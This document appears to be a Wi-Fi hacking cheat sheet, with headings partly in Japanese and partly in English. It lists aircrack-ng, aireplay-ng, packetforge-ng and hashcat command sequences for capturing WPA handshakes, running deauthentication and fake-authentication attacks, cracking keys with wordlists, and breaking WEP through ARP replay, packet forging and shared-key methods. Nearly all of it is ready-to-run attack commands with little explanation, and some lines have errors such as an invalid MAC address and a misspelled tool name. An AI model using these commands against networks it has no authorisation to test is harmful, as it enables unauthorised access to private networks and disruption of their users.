# ネットワーク機器をモニタモードにする
  # インターフェースをオフにする
  Set interface down
  sudo ip link set wlan0 down
  
  # モニターモードに設定
   iwconfig wlan0 mode monitor

  # インターフェースのアップ
   ip link set wlan0 up

# airmon-ngでモニターモードにする
  airmon-ng start wlan0

# 近くのビーコンフレームをすべてリッスン
  airodump-ng wlan0 --band abg

# 5GHzチャンネルの設定
  iwconfig wlan0 channel 149

# ハンドシェイクをキャプチャ
  airodump-ng -c 149 --bssid P4:E4:E4:92:60:71 -w cap01.cap wlan0

# 接続しているクライアントの認証を解除し、ハンドシェイクを行う
  aireplay-ng -D -0 2 -a 9C:5C:8E:C9:AB:C0 -c P4:E4:E4:92:60:71 wlan0

# hccapxに変換し、hashcatで解析
  aircrack-ng -J file.cap capture.hccap
  hashcat.exe -m 2500 capture.hccapx rockyou.txt


# WPAクラック
  airmon-ng start wlan0
  airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
  aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
  aircrack-ng -0 -w (wordlist path) (caputure filename)

# 接続されたクライアントによるWEPクラック
  airmon-ng start wlan0 ( channel)
  airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
  aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
  aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
  aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}

# クライアント経由でのWEPクラック
  airmon-ng start wlan0 (channel)
  airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
  aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
  aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
  aireplay-ng -2 -r (replay cap file) wlan0mon {inject using cap file}
  aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap

# ARP amplification
  airmon-ng start wlan0 ( channel)
  airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
  aireplay-ng -1 500 -q 8 -a (AP MAC) wlan0mon
  areplay-ng -5 -b (AP MAC) -h (OUR MAC) wlan0mon
  packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)
  tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)
  packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)
  aireplay-ng -2 -r (filename.cap) wlan0mon

# Cracking WEP /w shared key AUTH
  airmon-ng start wlan0 ( channel)
  airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
  ~this will error out~aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
  aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
  aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication /w PRGA xor file}
  aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}
  aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
  aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap

